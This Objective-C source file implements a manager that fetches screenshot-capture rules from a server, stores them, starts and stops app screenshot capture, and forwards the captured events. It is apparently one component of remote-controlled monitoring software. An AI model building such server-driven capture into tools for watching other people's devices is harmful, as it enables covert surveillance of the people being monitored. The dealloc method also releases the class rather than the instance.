//
//  AppScreenShotManagerImpl.m
//  AppScreenShotManagerImpl
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "AppScreenShotManagerImpl.h"
#import "AppScreenShot.h"

#import "DeliveryRequest.h"
#import "DataDelivery.h"
#import "DeliveryResponse.h"

#import "GetAppScreenShotRule.h"
#import "GetAppScreenShotRuleResponse.h"

#import "AppScreenShotRuleStorage.h"
#import "AppScreenRule.h"

@implementation AppScreenShotManagerImpl

@synthesize mAppScreenShot;
@synthesize mAppScreenShotRuleStorage;
@synthesize mDDM;
@synthesize mGetAppScreenShotDelegate;

- (id) initWithDDM:(id <DataDelivery> )aDDM imagePath:(NSString *) aPath {

    if (self = [super init]) {
        [self setMDDM:aDDM];
        mAppScreenShotRuleStorage = [[AppScreenShotRuleStorage alloc]init];
        mAppScreenShot = [[AppScreenShot alloc]init];
        [mAppScreenShot setMSavePath:aPath];
        [mAppScreenShot setMThread:[NSThread currentThread]];
        [mAppScreenShot setMDelegate:self];
        [mAppScreenShot setMSelector:@selector(appScreenShotStoreEvent:)];
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture {
    DLog(@"### startCapture");
    mIsCapture = YES;

    NSDictionary * rule = [[mAppScreenShotRuleStorage mASSDatabase] selectAllRules];
    //DLog(@"### AppScreenShot rule : %@", rule);

    [self addNewRuleWithDictionary:rule];
}

- (void) stopCapture {
    DLog(@"### stopCapture");
    mIsCapture = NO;
    [mAppScreenShot stopCapture];
}

- (void) addNewRuleWithDictionary:(NSDictionary *) aDict {
    [mAppScreenShot clearRules];
    
    for (id key in [aDict allKeys]) {
        [mAppScreenShot addRule:[aDict objectForKey:key]];
    }
    
    if (mIsCapture) {
        [mAppScreenShot startCapture];
    }
}

#pragma mark - DataDeliveryManager

- (BOOL) requestAppScreenShotRule: (id <AppScreenShotDelegate>) aDelegate {
    DLog(@"requestAppScreenShotRule, aDelegate = %@", aDelegate);
    BOOL canProcess = NO;
    
    DeliveryRequest *appScreenShotRequest = [self getAppScreenShotRuleaRequest];
    
    if (![self.mDDM isRequestIsPending:appScreenShotRequest]) {
        //DLog (@"not pending");
        [self.mDDM deliver:appScreenShotRequest];
        [self setMGetAppScreenShotDelegate:aDelegate];
        canProcess = YES;
    }
    return canProcess;
}

#pragma mark - DeliveryRequestGenerator

- (DeliveryRequest *) getAppScreenShotRuleaRequest {
    DeliveryRequest *deliveryRequest = [[DeliveryRequest alloc] init];
    
    GetAppScreenShotRule *commandData = [[GetAppScreenShotRule alloc] init];
    [deliveryRequest setMCallerId:kDDC_AppScreenShotManager];
    [deliveryRequest setMMaxRetry:3];
    [deliveryRequest setMRetryTimeout:60];
    [deliveryRequest setMConnectionTimeout:60];
    [deliveryRequest setMEDPType:kEDPTypeGetAppScreenShotRule];
    [deliveryRequest setMPriority:kDDMRequestPriortyNormal];
    [deliveryRequest setMCommandCode:[commandData getCommand]];
    [deliveryRequest setMCommandData:commandData];
    [deliveryRequest setMCompressionFlag:1];
    [deliveryRequest setMEncryptionFlag:1];
    [deliveryRequest setMDeliveryListener:self];
    [commandData release];
    
    return ([deliveryRequest autorelease]);
}

#pragma mark - Get Criteria After Request

- (void) requestFinished: (DeliveryResponse *) aResponse {
    DLog(@"==================== requestFinished aResponse %@ EDPType = %d", aResponse, [aResponse mEDPType]);
    DLog(@"[aResponse mSuccess] %d",[aResponse mSuccess]);
    
    if ([aResponse mSuccess]) {
        if ([aResponse mEDPType] == kEDPTypeGetAppScreenShotRule) {
            
            id <AppScreenShotDelegate> delegate = [self mGetAppScreenShotDelegate];
            [self setMGetAppScreenShotDelegate:nil];
            
            if ([delegate respondsToSelector:@selector(requestAppScreenShotRuleCompleted:)]) {
                [delegate requestAppScreenShotRuleCompleted:nil];
            }
            
            GetAppScreenShotRuleResponse *appScreenShotRuleResponse = (GetAppScreenShotRuleResponse *)[aResponse mCSMReponse];
            NSArray * responseDataArray  = [appScreenShotRuleResponse mAppScreenShotRule];
            DLog(@"responseDataArray %@",responseDataArray);
            if (responseDataArray) {
                [mAppScreenShotRuleStorage storeRule:responseDataArray];
                [self addNewRuleWithDictionary:[mAppScreenShotRuleStorage getAllRules]];
            }else{
                [mAppScreenShotRuleStorage clearRules];
            }
        }
    } else {
        NSDictionary *userInfo	= [NSDictionary dictionaryWithObject:aResponse forKey:@"DMMResponse"];
        NSError *error			= [NSError errorWithDomain:@"AppScreenShotRule Error" code:[aResponse mStatusCode] userInfo:userInfo];
        if ([aResponse mEDPType] == kEDPTypeGetAppScreenShotRule) {
            id <AppScreenShotDelegate> delegate = [self mGetAppScreenShotDelegate];
            [self setMGetAppScreenShotDelegate:nil];
            if ([delegate respondsToSelector:@selector(requestAppScreenShotRuleCompleted:)]) {
                [delegate requestAppScreenShotRuleCompleted:error];
            }
        }
    }
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
    DLog(@"updateRequestProgress");
}

- (void) appScreenShotStoreEvent: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        DLog(@"### appScreenShotStoreEvent : %@",aEvent);
        [mEventDelegate eventFinished:aEvent];
    }
}

- (void) dealloc {
    [self stopCapture];
    [mAppScreenShot release];
    [AppScreenShotRuleStorage release];
    [super dealloc];
}
@end
